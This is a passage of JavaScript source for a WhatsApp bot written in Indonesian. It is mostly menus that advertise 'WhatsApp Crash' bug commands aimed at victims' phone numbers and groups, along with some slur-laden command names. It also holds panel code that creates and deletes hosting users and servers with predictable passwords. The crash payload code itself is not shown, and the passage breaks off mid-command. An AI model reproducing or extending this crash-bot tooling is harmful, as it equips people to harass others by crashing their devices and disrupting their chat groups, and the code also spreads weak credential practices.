           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'bugmenu': case 'menubug': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG PC V1 ✨ ⌋ ✵
│⌲ ${global.rezzx9} attackwapc 1-5
│⌲ ${global.rezzx9} attackgc
│⌲ ${global.rezzx9} attackvip
│⌲ ${global.rezzx9} allmenubug
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackwapc1': case 'attackwa1': case 'attackwacpm1': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG PC V1 ✨ ⌋ ✵
│⌲ ${global.rezzx9} bugpepek _628xxx_
│⌲ ${global.rezzx9} bugpeler _628xxx_
│⌲ ${global.rezzx9} send-bug _628xxx_
│⌲ ${global.rezzx9} send-penis _628xxx_
│⌲ ${global.rezzx9} loh-c1 _628xxx_
│⌲ ${global.rezzx9} apa-si _628xxx_
│⌲ ${global.rezzx9} biji-kuda _628xxx_
│⌲ ${global.rezzx9} mati-aja-lu _628xxx_
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackwapc2': case 'attackwa2': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG PC V2 ✨ ⌋ ✵
│⌲ ${global.rezzx9} whatscrash _628xxx_
│⌲ ${global.rezzx9} rezzxv2 _628xxx_
│⌲ ${global.rezzx9} rezzxv3 _628xxx_
│⌲ ${global.rezzx9} radzzv1 _628xxx_
│⌲ ${global.rezzx9} crashwhat _628xxx_
│⌲ ${global.rezzx9} radzzv3 _628xxx_
│⌲ ${global.rezzx9} dipiziv1 _628xxx_
│⌲ ${global.rezzx9} dipiziv2 _628xxx_
│⌲ ${global.rezzx9} dipiziv3 _628xxx_
│⌲ ${global.rezzx9} kalem-geh _628xxx_
│⌲ ${global.rezzx9} santai-aja _628xxx_
╰────────────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackwapc3': case 'attackwa3': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG PC V3 ✨ ⌋ ✵
│⌲ ${global.rezzx9} mode-peler _628xxx_
│⌲ ${global.rezzx9} anjay-bisa-gitu _628xxx_
│⌲ ${global.rezzx9} send-bokep _628xxx_
│⌲ ${global.rezzx9} try-hard _628xxx_
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackwa4': case 'attackwapc4': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG DI TEMPAT✨ ⌋ ✵
│⌲ ${global.rezzx9} misi-paket
│⌲ ${global.rezzx9} bang-sehat
│⌲ ${global.rezzx9} assalamualaikum
│⌲ ${global.rezzx9} mau-beraq
│⌲ ${global.rezzx9} pap-penis
│⌲ ${global.rezzx9} suki-ajg
│⌲ ${global.rezzx9} 😐
│⌲ ${global.rezzx9} 🐲
│⌲ ${global.rezzx9} 😴
│⌲ ${global.rezzx9} 💋
│⌲ ${global.rezzx9} 🖕
│⌲ ${global.rezzx9} 🌚
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackwa5': case 'attackwapc5': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG EMOJI ✨ ⌋ ✵
│⌲ ${global.rezzx9} ✨ _628xxx_
│⌲ ${global.rezzx9} 🔥 _628xxx_
│⌲ ${global.rezzx9} 😘 _628xxx_
│⌲ ${global.rezzx9} 🍂 _628xxx_
│⌲ ${global.rezzx9} ⭐ _628xxx_
│⌲ ${global.rezzx9} 👺 _628xxx_
│⌲ ${global.rezzx9} 🗿 _628xxx_
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG EMOJI  JUMLAH✨ ⌋ ✵
│⌲ ${global.rezzx9} 🤗 _628xxx|1_
│⌲ ${global.rezzx9} 😜 _628xxx|1_
│⌲ ${global.rezzx9} ❤️ _628xxx|1_
│⌲ ${global.rezzx9} 💔 _628xxx|1_
│⌲ ${global.rezzx9} ⚡ _628xxx|1_
│⌲ ${global.rezzx9} 💦 _628xxx|1_
│⌲ ${global.rezzx9} ☠️ _628xxx|1_
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackgc1': case 'attackgrup1': case 'attackgc': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG GRUP ✨ ⌋ ✵
│⌲ ${global.rezzx9} gc-ajg _linkgc/idgc_
│⌲ ${global.rezzx9} penghitaman-gc _link/idgc_
│⌲ ${global.rezzx9} grup-bokep _link/idgc_
│⌲ ${global.rezzx9} open-promosi-vcs _linkgc/idgc_
│⌲ ${global.rezzx9} grup-negro _linkgc/idgc_
│⌲ ${global.rezzx9} bubarin-gcnya _idgc/linkgc_
│⌲ ${global.rezzx9} kudeta _linkgc/idgc_
│⌲ ${global.rezzx9} rezzx-in-here _linkgc/idgc_
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'attackvip': case 'attackvip1': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG JUMLAH ✨ ⌋ ✵
│⌲ ${global.rezzx9} rezzdelay _628xxx|1_
│⌲ ${global.rezzx9} tembusios _628xxx|1_
│⌲ ${global.rezzx9} iosfullv2 _628xxx|1_
│⌲ ${global.rezzx9} darkness _628xxx|1_
│⌲ ${global.rezzx9} slayer07 _628zxx|1_
│⌲ ${global.rezzx9} virkon _628xxx|1_
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'allmenubug': case 'allbug': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG PC V1 ✨ ⌋ ✵
│⌲ ${global.rezzx9} bugpepek _628xxx_
│⌲ ${global.rezzx9} bugpeler _628xxx_
│⌲ ${global.rezzx9} send-bug _628xxx_
│⌲ ${global.rezzx9} send-penis _628xxx_
│⌲ ${global.rezzx9} loh-c1 _628xxx_
│⌲ ${global.rezzx9} apa-si _628xxx_
│⌲ ${global.rezzx9} biji-kuda _628xxx_
│⌲ ${global.rezzx9} mati-aja-lu _628xxx_
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG PC V2 ✨ ⌋ ✵
│⌲ ${global.rezzx9} whatscrash _628xxx_
│⌲ ${global.rezzx9} rezzxv2 _628xxx_
│⌲ ${global.rezzx9} rezzxv3 _628xxx_
│⌲ ${global.rezzx9} radzzv1 _628xxx_
│⌲ ${global.rezzx9} crashwhat _628xxx_
│⌲ ${global.rezzx9} radzzv3 _628xxx_
│⌲ ${global.rezzx9} dipiziv1 _628xxx_
│⌲ ${global.rezzx9} dipiziv2 _628xxx_
│⌲ ${global.rezzx9} dipiziv3 _628xxx_
│⌲ ${global.rezzx9} kalem-geh _628xxx_
│⌲ ${global.rezzx9} santai-aja _628xxx_
╰────────────────

┌ ⛯ ⌈ ✨ MENU BUG PC V3 ✨ ⌋ ✵
│⌲ ${global.rezzx9} mode-peler _628xxx_
│⌲ ${global.rezzx9} anjay-bisa-gitu _628xxx_
│⌲ ${global.rezzx9} send-bokep _628xxx_
│⌲ ${global.rezzx9} try-hard _628xxx_
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG DI TEMPAT✨ ⌋ ✵
│⌲ ${global.rezzx9} misi-paket
│⌲ ${global.rezzx9} bang-sehat
│⌲ ${global.rezzx9} assalamualaikum
│⌲ ${global.rezzx9} mau-beraq
│⌲ ${global.rezzx9} pap-penis
│⌲ ${global.rezzx9} suki-ajg
│⌲ ${global.rezzx9} 😐
│⌲ ${global.rezzx9} 🐲
│⌲ ${global.rezzx9} 😴
│⌲ ${global.rezzx9} 💋
│⌲ ${global.rezzx9} 🖕
│⌲ ${global.rezzx9} 🌚
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG EMOJI ✨ ⌋ ✵
│⌲ ${global.rezzx9} ✨ _628xxx_
│⌲ ${global.rezzx9} 🔥 _628xxx_
│⌲ ${global.rezzx9} 😘 _628xxx_
│⌲ ${global.rezzx9} 🍂 _628xxx_
│⌲ ${global.rezzx9} ⭐ _628xxx_
│⌲ ${global.rezzx9} 👺 _628xxx_
│⌲ ${global.rezzx9} 🗿 _628xxx_
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG EMOJI  JUMLAH✨ ⌋ ✵
│⌲ ${global.rezzx9} 🤗 _628xxx|1_
│⌲ ${global.rezzx9} 😜 _628xxx|1_
│⌲ ${global.rezzx9} ❤️ _628xxx|1_
│⌲ ${global.rezzx9} 💔 _628xxx|1_
│⌲ ${global.rezzx9} ⚡ _628xxx|1_
│⌲ ${global.rezzx9} 💦 _628xxx|1_
│⌲ ${global.rezzx9} ☠️ _628xxx|1_
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG GRUP ✨ ⌋ ✵
│⌲ ${global.rezzx9} gc-ajg _linkgc/idgc_
│⌲ ${global.rezzx9} penghitaman-gc _link/idgc_
│⌲ ${global.rezzx9} grup-bokep _link/idgc_
│⌲ ${global.rezzx9} open-promosi-vcs _linkgc/idgc_
│⌲ ${global.rezzx9} grup-negro _linkgc/idgc_
│⌲ ${global.rezzx9} bubarin-gcnya _idgc/linkgc_
│⌲ ${global.rezzx9} kudeta _linkgc/idgc_
│⌲ ${global.rezzx9} rezzx-in-here _linkgc/idgc_
╰──────────

┌ ⛯ ⌈ ✨ MENU BUG JUMLAH ✨ ⌋ ✵
│⌲ ${global.rezzx9} rezzdelay _628xxx|1_
│⌲ ${global.rezzx9} tembusios _628xxx|1_
│⌲ ${global.rezzx9} iosfullv2 _628xxx|1_
│⌲ ${global.rezzx9} darkness _628xxx|1_
│⌲ ${global.rezzx9} slayer07 _628zxx|1_
│⌲ ${global.rezzx9} virkon _628xxx|1_
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'panelmenu': case 'menupanel':  {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU REZZX ✨ ⌋ ✵
│⌲ ${global.rezzx1} TOADMIN nama,628xxx
│⌲ ${global.rezzx2} UNLI nama,628xxx
│⌲ ${global.rezzx3} 11gb nama,628xxx
│⌲ ${global.rezzx2} 10gb nama,628xxx
│⌲ ${global.rezzx1} 9gb nama,628xxx
│⌲ ${global.rezzx2} 8gb nama,628xxx
│⌲ ${global.rezzx3} 7gb nama,628xxx
│⌲ ${global.rezzx3} 6gb nama,628xxx
│⌲ ${global.rezzx2} 5gb nama,628xxx
│⌲ ${global.rezzx1} 4gb nama,628xxx
│⌲ ${global.rezzx2} 3gb nama,628xxx
│⌲ ${global.rezzx3} 2gb nama,628xxx
│⌲ ${global.rezzx2} 1gb nama,628xxx
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break

case 'tqto': case 'thanksto': case 'support': {
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const menu = `*Hi @${sender.split("@")[0]} 👋😁

┌ ⛯ ⌈ 🤖 ɪɴꜰᴏ ʙᴏᴛ 🤖 ⌋ ✵ 
│⌲ NAMA BOT : ${namabot}
│⌲ NAMA OWNER : @${owner.split("@")[0]}
│⌲ VERSION SCRIPT : ${global.versisc}
│⌲ RUNTIME : ${runtime(process.uptime())}
╰──────────

┌ ⛯ ⌈ ✨ MENU SUPPORT ✨ ⌋ ✵
│⌲ ${global.rezzx1} REZZX ( PEMBUAT SC )
│⌲ ${global.rezzx2} RADZZ ( PENGSUPPORT )
│⌲ ${global.rezzx3} DIPIZI ( PENGSUPPORT 2 )
╰──────────

▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

© WhatsApp Crash
Powered by © Whatsapp
`


           rezzx.sendMessage(m.chat, { 
	           text: menu,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: global.namabot,
                            body: global.namaCreator,
                            thumbnailUrl: global.imageurl2,
                            sourceUrl: global.isLink,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                }, {
                    quoted: fkontak
                    })
     await rezzx.sendMessage(m.chat, {
                        audio: fs.readFileSync('./all/menu.mp3'),
                        mimetype: 'all/menu.mp3',
                        ptt: true
                    }, {
                        quoted: m
                    })
                }
             break


// FITUR CPANEL


                           case "listusr": {
  if (!isOwner) return reply(mess.only.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "BERIKUT LIST USER:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await rezzx.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break
        case "delusr": {
  if (!isOwner) return reply(`KHUSUS OWNER`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
                        case "listsrv": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await rezzx.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
        case "delsrv": {
      if (!isOwner) return reply(`KHUSUS OWN `)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case "1gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "30"
let disk = "1024"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
let d = (await rezzx.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "rezz2"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

👤 *USERNAME* : ${user.username}  
🔐 *PASSWORD* : ${password}  
🔗 *LINK LOGIN* : ${domain}

NOTE:
1.OWNER HANYA MENGIRIM DATA AKUN 1X 
2.JANGAN MENGSHARE AKUN PANEL ANDA 
3.NO SHARE WEBSITE PANEL 
4. NO MAKSA REFF 
5.JANGAN LUPA BILANG DONE         TERIMAKASIH
=====================================
`
rezzx.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: rezzx.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "2gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "60"
let disk = "2048"
let email = username + "rezz@rezzx.store"
akunlo = "https://telegra.ph/file/30286b88d6eba96af4e98.jpg" 
if (!u) return
